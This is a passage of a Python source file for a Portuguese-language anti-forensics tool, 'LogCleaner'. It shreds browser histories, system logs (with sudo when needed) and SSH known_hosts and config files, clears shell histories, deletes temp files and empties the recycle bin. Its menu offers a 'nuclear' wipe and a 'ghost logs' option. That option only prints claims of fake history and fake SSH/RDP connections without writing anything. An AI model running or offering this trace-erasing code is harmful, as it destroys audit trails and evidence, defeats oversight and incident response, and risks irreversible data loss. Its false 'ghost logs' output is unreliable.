            self.ssh_logs = [f"{home}\\.ssh\\known_hosts", f"{home}\\.ssh\\config"]

    def clear_screen(self):
        os.system("cls" if self.system == "windows" else "clear")

    def print_banner(self):
        banner = f"""
        """
        print(banner)

    def run_cmd(self, command, shell=False):
        try:
            if self.system == "windows":
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True
                )
            else:
                result = subprocess.run(
                    command, shell=shell, capture_output=True, text=True
                )
            return result.returncode == 0
        except:
            return False

    def secure_delete_linux(self, path):
        commands = [f"shred -zuf {path}", f"rm -rf {path}"]
        for cmd in commands:
            self.run_cmd(cmd, shell=True)

    def secure_delete_windows(self, path):
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    with open(path, "ba+") as f:
                        length = f.tell()
                        f.seek(0)
                        f.write(os.urandom(length))
                    os.remove(path)
                else:
                    import shutil

                    shutil.rmtree(path)
                return True
            except:
                try:
                    if os.path.isfile(path):
                        os.remove(path)
                    else:
                        import shutil

                        shutil.rmtree(path)
                    return True
                except:
                    return False
        return False

    def delete_logs(self):
        print(
            f"\n{BRIGHT_YELLOW}[+] Apagando logs de navegadores ({self.system})...{RESET}"
        )
        deleted_count = 0

        for browser_path in self.browser_paths:
            if os.path.exists(browser_path):
                try:
                    if self.system == "linux":
                        self.secure_delete_linux(browser_path)
                    else:
                        self.secure_delete_windows(browser_path)
                    print(
                        f"{BRIGHT_GREEN}   [OK] {os.path.basename(browser_path)}{RESET}"
                    )
                    deleted_count += 1
                except:
                    print(
                        f"{BRIGHT_RED}   [ERRO] {os.path.basename(browser_path)}{RESET}"
                    )

        print(f"\n{BRIGHT_YELLOW}[+] Apagando logs do sistema...{RESET}")
        for log_file in self.system_logs:
            if os.path.exists(log_file):
                try:
                    if self.system == "linux":
                        if not os.access(log_file, os.W_OK):
                            self.run_cmd(f"sudo shred -zuf {log_file}", shell=True)
                        else:
                            self.secure_delete_linux(log_file)
                    else:
                        self.secure_delete_windows(log_file)
                    print(f"{BRIGHT_GREEN}   [OK] {os.path.basename(log_file)}{RESET}")
                    deleted_count += 1
                except:
                    print(f"{BRIGHT_RED}   [ERRO] {os.path.basename(log_file)}{RESET}")

        print(f"\n{BRIGHT_YELLOW}[+] Apagando logs de conexoes...{RESET}")
        for ssh_log in self.ssh_logs:
            if os.path.exists(ssh_log):
                try:
                    if self.system == "linux":
                        self.secure_delete_linux(ssh_log)
                    else:
                        self.secure_delete_windows(ssh_log)
                    print(f"{BRIGHT_GREEN}   [OK] {os.path.basename(ssh_log)}{RESET}")
                    deleted_count += 1
                except:
                    print(f"{BRIGHT_RED}   [ERRO] {os.path.basename(ssh_log)}{RESET}")

        print(f"\n{BRIGHT_YELLOW}[+] Limpando rastros temporarios...{RESET}")
        if self.system == "linux":
            commands = [
                "history -c",
                "echo '' > ~/.bash_history",
                "echo '' > ~/.zsh_history",
                "find /tmp -type f -atime +1 -delete 2>/dev/null",
                "find /var/tmp -type f -atime +1 -delete 2>/dev/null",
            ]
        else:
            commands = [
                "ipconfig /flushdns",
                "del /q /f %temp%\\* 2>nul",
                'powershell -Command "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"',
            ]

        for cmd in commands:
            self.run_cmd(cmd, shell=True)

        print(
            f"\n{BRIGHT_GREEN}[SUCESSO] Limpeza completa! {deleted_count} alvos eliminados.{RESET}"
        )

    def create_ghost_logs(self):
        print(f"\n{BRIGHT_CYAN}[+] Criando logs fantasmas ({self.system})...{RESET}")

        ghost_sites = [
            "https://www.google.com/search?q=receita+bolo+cenoura",
            "https://www.youtube.com/watch?v=video_culinaria",
            "https://www.wikipedia.org/wiki/Historia_do_Brasil",
            "https://www.amazon.com.br/livros",
            "https://www.netflix.com/browse",
            "https://web.whatsapp.com",
            "https://www.instagram.com",
        ]

        ghost_ips = ["192.168.1.100", "10.0.0.50", "172.16.254.1", "192.168.0.150"]

        if self.system == "linux":
            fake_files = [
                "~/.bash_history",
                "~/.zsh_history",
                "~/.config/google-chrome/Default/History",
            ]
        else:
            fake_files = [
                f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
            ]

        for fake_file in fake_files:
            expanded_path = (
                os.path.expanduser(fake_file) if self.system == "linux" else fake_file
            )
            print(
                f"{LILAS}   [FANTASMA] Dados em {os.path.basename(expanded_path)}{RESET}"
            )

        for ip in ghost_ips:
            if self.system == "linux":
                print(f"{ROXO_CLA}   [CONEXAO] Conexao SSH fantasma: {ip}{RESET}")
            else:
                print(f"{ROXO_CLA}   [CONEXAO] Conexao RDP fantasma: {ip}{RESET}")

        print(
            f"\n{BRIGHT_GREEN}[SUCESSO] Logs fantasmas criados! Sistema ta todo confuso agora.{RESET}"
        )

    def check_admin(self):
        if self.system == "windows":
            try:
                import ctypes

                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0

    def show_menu(self):
        print(f"\n{BRIGHT_CYAN}Opcoes:{RESET}")
        print(f"{BRIGHT_GREEN}1 - Apagar TODOS os logs (nuclear){RESET}")
        print(f"{BRIGHT_BLUE}2 - Criar logs fantasmas (confusao){RESET}")
        print(f"{BRIGHT_RED}3 - Sair{RESET}")

    def run(self):
        self.clear_screen()
        self.print_banner()

        if not self.check_admin():
            print(
                f"{BRIGHT_YELLOW}[AVISO] Sem privilegios de admin. Alguns logs podem nao ser apagados.{RESET}"
            )

        while True:
            self.show_menu()

            try:
                choice = input(f"\n{BRIGHT_CYAN}Escolha: {RESET}").strip()

                if choice == "1":
                    print(
                        f"\n{BRIGHT_RED}[ATENCAO] Isso vai apagar TUDO no {self.system.upper()}!{RESET}"
                    )
                    confirm = input(
                        f"{BRIGHT_YELLOW}Digite 'CONFIRMAR' para continuar: {RESET}"
                    )
                    if confirm == "CONFIRMAR":
                        self.delete_logs()
                    else:
                        print(f"{BRIGHT_RED}Operacao cancelada.{RESET}")

                elif choice == "2":
                    self.create_ghost_logs()

                elif choice == "3":
                    print(f"\n{BRIGHT_CYAN}Saindo limpo...{RESET}")
                    sys.exit(0)

                else:
                    print(f"\n{BRIGHT_RED}Opcao invalida, irmao.{RESET}")

            except KeyboardInterrupt:
                print(f"\n\n{BRIGHT_CYAN}Saindo...{RESET}")
                sys.exit(0)
            except Exception as e:
                print(f"\n{BRIGHT_RED}Erro: {e}{RESET}")

    cleaner = LogCleaner()
    cleaner.run()


if __name__ == "__main__":
    menu()
